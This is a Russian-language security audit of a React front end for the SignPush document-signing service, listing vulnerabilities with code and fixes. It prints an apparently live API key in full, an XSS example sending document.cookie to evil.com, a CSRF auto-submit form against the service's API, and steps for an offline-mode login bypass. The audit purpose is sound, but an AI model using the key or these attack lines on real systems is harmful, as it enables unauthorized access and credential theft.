# 🔒 Уязвимости и проблемы безопасности

## Содержание
1. [Критические уязвимости](#критические-уязвимости)
2. [Проблемы высокого приоритета](#проблемы-высокого-приоритета)
3. [Проблемы среднего приоритета](#проблемы-среднего-приоритета)
4. [Ошибки в коде](#ошибки-в-коде)
5. [Рекомендации по устранению](#рекомендации-по-устранению)

---

## 🚨 Критические уязвимости

### 1. Hardcoded API Key в коде

**Расположение:** `src/pages/login/index.js:52`

```javascript
headers: {
    'Content-Type': 'application/json',
    'apiKey': '2e4ee3528082873f6407f3a42a85854156bef0b0ccb8336fd8843a3f13e2ff09'
}
```

**Проблема:**
- 🚨 API ключ виден в исходном коде
- 🚨 Виден в compiled bundle.js
- 🚨 Доступен через DevTools
- 🚨 Может быть использован злоумышленниками
- 🚨 Невозможно изменить без пересборки

**Риски:**
1. Несанкционированный доступ к API
2. DDoS атаки на API
3. Утечка данных пользователей
4. Исчерпание квот API

**Правильное решение:**

```javascript
// .env
REACT_APP_API_KEY=2e4ee3528082873f6407f3a42a85854156bef0b0ccb8336fd8843a3f13e2ff09

// В коде
headers: {
    'apiKey': process.env.REACT_APP_API_KEY
}
```

**⚠️ Важно:** Даже с .env файлом ключ все равно попадет в bundle! Лучшее решение — **серверный proxy**.

**Идеальное решение:**
```
Client → Your Backend (с API ключом) → SignPush API
```

---

### 2. Bypass аутентификации при ошибке сети

**Расположение:** `src/pages/login/index.js:54-75`

```javascript
try {
    response = await axios.patch(LOGIN_URL, ...);
} catch (err) {
    console.log(err);
    setErrorMessage('Что-то пошло не так!');
    setDisabled(false);

    // ❌❌❌ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ ❌❌❌
    let expires = new Date()
    expires.setTime(expires.getTime() + 1000000);
    setCookie('user', user, { path: '/',  expires});
    setCookie('token', response?.data?.token || '213', { path: '/',  expires});

    setUser('');
    setPassword('');
    setAuth({user});

    setDisabled(false);
    navigate(from, { replace: true });
    return;
}
```

**Проблема:**
- 🚨 При **ЛЮБОЙ** ошибке (сеть недоступна, timeout, CORS) пользователь авторизуется!
- 🚨 Токен устанавливается в `'213'` при отсутствии ответа
- 🚨 Можно войти без валидных учетных данных
- 🚨 Полный bypass системы безопасности

**Сценарий эксплуатации:**
1. Открыть DevTools → Network → Offline mode
2. Ввести любой email/пароль
3. Нажать "Войти"
4. Получить доступ к приложению с токеном '213'

**Правильное решение:**

```javascript
try {
    response = await axios.patch(LOGIN_URL, ...);
    
    // Обработка только успешного ответа
    if (response?.data?.status === 0) {
        setCookie('user', user, { path: '/', expires });
        setCookie('token', response.data.token, { path: '/', expires });
        setAuth({user});
        navigate(from, { replace: true });
    } else {
        setErrorMessage(response?.data?.message || 'Ошибка входа');
    }
} catch (err) {
    // ✅ При ошибке НЕ авторизовываем
    if (err.response) {
        setErrorMessage(err.response.data?.message || 'Ошибка сервера');
    } else if (err.request) {
        setErrorMessage('Нет соединения с сервером');
    } else {
        setErrorMessage('Произошла ошибка');
    }
    setDisabled(false);
    // ❌ НЕ вызываем navigate и setCookie
}
```

---

### 3. XSS уязвимость через Cookies

**Расположение:** `src/pages/login/index.js`, `src/components/require-auth/index.js`

```javascript
setCookie('user', user, { path: '/', expires });
setCookie('token', response?.data?.token, { path: '/', expires });
```

**Проблема:**
- 🚨 Cookies без флага `HttpOnly`
- 🚨 Доступны через `document.cookie`
- 🚨 Могут быть украдены через XSS
- 🚨 Токен виден в DevTools

**Сценарий XSS атаки:**
```javascript
// Злоумышленник внедряет скрипт
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

**Почему это возможно:**
- Без `HttpOnly` flag cookies доступны из JavaScript
- React не защищает от XSS если используется `dangerouslySetInnerHTML`
- User-generated content может содержать вредоносный код

**Правильное решение:**

```javascript
// ✅ HttpOnly cookies (устанавливаются сервером)
Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict

// ✅ Или использовать localStorage для non-sensitive данных
localStorage.setItem('user', user);

// ✅ Токен хранить в httpOnly cookie (устанавливается бэкендом)
```

**Дополнительная защита:**
```javascript
// Content Security Policy
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

---

### 4. Слабое время жизни сессии

**Расположение:** `src/pages/login/index.js:62`

```javascript
let expires = new Date();
expires.setTime(expires.getTime() + 1000000);  // +1000 секунд
```

**Проблема:**
- 🚨 Сессия живет всего **16 минут 40 секунд**
- 🚨 Пользователь будет часто разлогиниваться
- 🚨 Плохой UX

**Вероятная ошибка:** хотели `1000000` миллисекунд, но это миллисекунды от эпохи.

**Правильное решение:**

```javascript
// ✅ 24 часа
let expires = new Date();
expires.setTime(expires.getTime() + 24 * 60 * 60 * 1000);

// Или с Luxon
const expires = DateTime.now().plus({ days: 1 }).toJSDate();

// Или с maxAge
setCookie('token', token, { 
    path: '/', 
    maxAge: 86400  // 24 часа в секундах
});
```

---

## ⚠️ Проблемы высокого приоритета

### 5. Отсутствие CSRF защиты

**Проблема:**
- Нет CSRF токенов
- API принимает запросы без проверки origin
- Возможна Cross-Site Request Forgery атака

**Сценарий атаки:**
```html
<!-- Злоумышленный сайт -->
<form action="https://test.signpush.ru/api/v4.1/paper/document" method="POST">
  <input name="action" value="delete_all">
</form>
<script>document.forms[0].submit();</script>
```

**Решение:**
- Backend должен проверять CSRF токен
- Использовать SameSite=Strict для cookies
- Проверять Referer/Origin headers

---

### 6. Нет валидации на клиенте

**Расположение:** `src/pages/login/index.js`

```javascript
<input required type="email" />
<input required type="password" />
```

**Проблема:**
- Только HTML5 валидация
- Нет проверки сложности пароля
- Нет проверки формата email на JS уровне
- Можно обойти через DevTools

**Правильное решение:**

```javascript
const validateEmail = (email) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
};

const validatePassword = (password) => {
    return password.length >= 8;
};

const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateEmail(user)) {
        setErrorMessage('Неверный формат email');
        return;
    }
    
    if (!validatePassword(password)) {
        setErrorMessage('Пароль должен быть минимум 8 символов');
        return;
    }
    
    // ... API запрос
};
```

---

### 7. Отсутствие Rate Limiting

**Проблема:**
- Нет ограничения на количество попыток входа
- Возможна brute-force атака
- Можно перебирать пароли

**Решение:**
```javascript
// Frontend rate limiting (легко обойти)
const [attempts, setAttempts] = useState(0);
const [blockedUntil, setBlockedUntil] = useState(null);

if (attempts >= 5) {
    setBlockedUntil(Date.now() + 15 * 60 * 1000);  // 15 минут
    setErrorMessage('Слишком много попыток. Попробуйте через 15 минут');
    return;
}

// ✅ Лучше: Backend rate limiting
```

---

### 8. Нет HTTPS enforcement

**Расположение:** `public/index.html`

**Проблема:**
- Нет автоматического редиректа на HTTPS
- Пароли могут передаваться по HTTP
- Man-in-the-middle атаки

**Решение:**

```javascript
// В index.html
<script>
  if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
    location.replace(`https:${location.href.substring(location.protocol.length)}`);
  }
</script>
```

```javascript
// HTTP Strict Transport Security (на сервере)
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

---

## 🔶 Проблемы среднего приоритета

### 9. Опечатка в axios.js конфигурации

**Расположение:** `src/api/axios.js:3`

```javascript
export default axios.create({
    baseUrl: 'https://test.signpush.ru/api/v4.1'  // ❌ baseUrl
});
```

**Проблема:**
- Должно быть `baseURL` (с заглавными буквами)
- Из-за этого базовый URL не применяется
- Приходится указывать полный URL в каждом запросе

**Решение:**

```javascript
export default axios.create({
    baseURL: 'https://test.signpush.ru/api/v4.1',  // ✅ baseURL
    timeout: 10000,
    headers: {
        'Content-Type': 'application/json'
    }
});
```

---

### 10. Ошибка в RequireAuth

**Расположение:** `src/components/require-auth/index.js:5`

```javascript
const { location } = useLocation();  // ❌ Ошибка деструктуризации
```

**Проблема:**
- `useLocation()` возвращает объект location напрямую
- Не нужна деструктуризация
- location будет undefined

**Решение:**

```javascript
const location = useLocation();  // ✅ Правильно
```

---

### 11. Проверка на строку 'undefined'

**Расположение:** `src/components/require-auth/index.js:8`

```javascript
cookies.user !== 'undefined'
```

**Проблема:**
- Проверка на строку 'undefined' намекает на проблему с удалением cookies
- Где-то в коде cookie сохраняется как строка вместо удаления

**Правильное решение:**

```javascript
// Проверка
const isAuthenticated = cookies.user && cookies.token && 
                       typeof cookies.user === 'string' &&
                       cookies.user !== 'undefined';

// При logout правильно удалять
removeCookie('user');
removeCookie('token');
// Не делать: setCookie('user', 'undefined')
```

---

### 12. Утечка памяти в PdfReader

**Расположение:** `src/components/pdf-reader/pdf-reader.js:167-178`

```javascript
canvasOfDoc?.addEventListener("mousedown", function (e) {
    handleMouseIn(e);
});
canvasOfDoc?.addEventListener("mousemove", function (e) {
    handleMouseMove(e);
});
// ... и т.д.
```

**Проблема:**
- Event listeners добавляются при каждом рендере
- Не удаляются при unmount
- Утечка памяти при множественных монтированиях

**Правильное решение:**

```javascript
useEffect(() => {
    if (!canvasOfDoc) return;
    
    const handleMouseDown = (e) => handleMouseIn(e);
    const handleMouseMove = (e) => handleMouseMove(e);
    const handleMouseUp = (e) => handleMouseUp(e);
    const handleMouseOut = (e) => handleMouseOut(e);
    
    canvasOfDoc.addEventListener("mousedown", handleMouseDown);
    canvasOfDoc.addEventListener("mousemove", handleMouseMove);
    canvasOfDoc.addEventListener("mouseup", handleMouseUp);
    canvasOfDoc.addEventListener("mouseout", handleMouseOut);
    
    // ✅ Cleanup
    return () => {
        canvasOfDoc.removeEventListener("mousedown", handleMouseDown);
        canvasOfDoc.removeEventListener("mousemove", handleMouseMove);
        canvasOfDoc.removeEventListener("mouseup", handleMouseUp);
        canvasOfDoc.removeEventListener("mouseout", handleMouseOut);
    };
}, [canvasOfDoc]);
```

---

### 13. Отсутствие Error Boundary

**Проблема:**
- Нет Error Boundary компонента
- При ошибке в компоненте падает все приложение
- Пользователь видит белый экран

**Решение:**

```javascript
// ErrorBoundary.js
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true };
  }

  componentDidCatch(error, errorInfo) {
    console.error('Error caught:', error, errorInfo);
    // Отправить на сервер логирования
  }

  render() {
    if (this.state.hasError) {
      return <h1>Что-то пошло не так.</h1>;
    }

    return this.props.children;
  }
}

// index.js
<ErrorBoundary>
  <AuthProvider>
    <App />
  </AuthProvider>
</ErrorBoundary>
```

---

### 14. Нет обработки expired токена

**Проблема:**
- Нет проверки срока действия токена
- При истечении токена пользователь видит ошибки API
- Нет автоматического редиректа на login

**Решение:**

```javascript
// axios interceptor
axios.interceptors.response.use(
  response => response,
  error => {
    if (error.response?.status === 401) {
      // Токен истек
      removeCookie('user');
      removeCookie('token');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);
```

---

## 🐛 Ошибки в коде

### 15. Опечатка в параметре API

**Расположение:** `src/pages/documents/index.js:36`

```javascript
params['sugnatures'] = 1;  // ❌ Опечатка: должно быть "signatures"
```

**Решение:**
```javascript
params['signatures'] = 1;  // ✅ Исправлено
```

---

### 16. Небезопасный парсинг количества документов

**Расположение:** `src/pages/documents/index.js:51-54`

```javascript
let countOfDocuments = result.data?.message?.substring(
    result.data?.message.indexOf('are ') + 4, 
    result.data?.message.lastIndexOf('papers')
);
```

**Проблема:**
- Парсинг из текста сообщения
- Зависимость от формата сообщения
- Может сломаться при изменении API

**Решение:**

```javascript
// Запросить count напрямую из API
const countOfDocuments = result.data?.total || result.data.papers.length;

// Или безопасный парсинг
const parseCount = (message) => {
    const match = message?.match(/are (\d+) papers/);
    return match ? parseInt(match[1], 10) : 0;
};
```

---

### 17. Пароль в plain text в state

**Расположение:** `src/pages/login/index.js:17`

```javascript
const [password, setPassword] = useState('');
```

**Проблема:**
- Пароль хранится в plain text в state
- Виден в React DevTools
- Остается в памяти

**Минимизация риска:**
```javascript
// После отправки очищать
setPassword('');

// Или использовать useRef (не вызывает re-render)
const passwordRef = useRef('');
```

---

## 📋 Рекомендации по устранению

### Приоритет 1 (Критический) - Немедленно

1. **Исправить bypass аутентификации**
   - Убрать авторизацию из catch блока
   - Добавить правильную обработку ошибок

2. **Переместить API ключ**
   - Использовать переменные окружения
   - Лучше - серверный proxy

3. **Исправить опечатку в RequireAuth**
   - `const location = useLocation()`

### Приоритет 2 (Высокий) - В течение недели

4. **Добавить Error Boundary**
5. **Исправить утечку памяти в PdfReader**
6. **Добавить обработку expired токена**
7. **Увеличить время жизни сессии**

### Приоритет 3 (Средний) - В течение месяца

8. **Добавить валидацию**
9. **Исправить axios.js конфигурацию**
10. **Добавить HTTPS enforcement**
11. **Улучшить обработку cookies**

### Приоритет 4 (Низкий) - При возможности

12. **Добавить rate limiting**
13. **Улучшить CSP headers**
14. **Добавить логирование ошибок**

---

## 🛡️ Общие рекомендации по безопасности

### 1. Защита от XSS
- Использовать Content Security Policy
- Не использовать `dangerouslySetInnerHTML`
- Санитизировать user input

### 2. Защита от CSRF
- CSRF токены в формах
- SameSite=Strict cookies
- Проверка Origin/Referer

### 3. Безопасное хранение данных
- HttpOnly cookies для токенов
- Шифрование чувствительных данных
- Не хранить пароли на клиенте

### 4. Сетевая безопасность
- HTTPS везде
- HSTS header
- Certificate pinning

### 5. Валидация
- На клиенте И на сервере
- Whitelist подход
- Санитизация входных данных

### 6. Аудит безопасности
- Регулярный код ревью
- Автоматическое сканирование (npm audit)
- Обновление зависимостей

---

## 📊 Сводная таблица уязвимостей

| № | Уязвимость | Критичность | Сложность исправления | Статус |
|---|------------|-------------|----------------------|--------|
| 1 | Hardcoded API Key | 🔴 Критическая | Средняя | ❌ Не исправлено |
| 2 | Bypass аутентификации | 🔴 Критическая | Легкая | ❌ Не исправлено |
| 3 | XSS через Cookies | 🔴 Критическая | Средняя | ❌ Не исправлено |
| 4 | Короткая сессия | 🟠 Высокая | Легкая | ❌ Не исправлено |
| 5 | Нет CSRF защиты | 🟠 Высокая | Сложная (backend) | ❌ Не исправлено |
| 6 | Слабая валидация | 🟠 Высокая | Средняя | ❌ Не исправлено |
| 7 | Нет Rate Limiting | 🟠 Высокая | Сложная (backend) | ❌ Не исправлено |
| 8 | Нет HTTPS enforcement | 🟠 Высокая | Легкая | ❌ Не исправлено |
| 9 | Опечатка в axios | 🟡 Средняя | Легкая | ❌ Не исправлено |
| 10 | Ошибка в RequireAuth | 🟡 Средняя | Легкая | ❌ Не исправлено |
| 11 | Утечка памяти | 🟡 Средняя | Средняя | ❌ Не исправлено |
| 12 | Нет Error Boundary | 🟡 Средняя | Легкая | ❌ Не исправлено |

---

**⚠️ ВАЖНО:** Рекомендуется исправить критические уязвимости перед выводом в production!
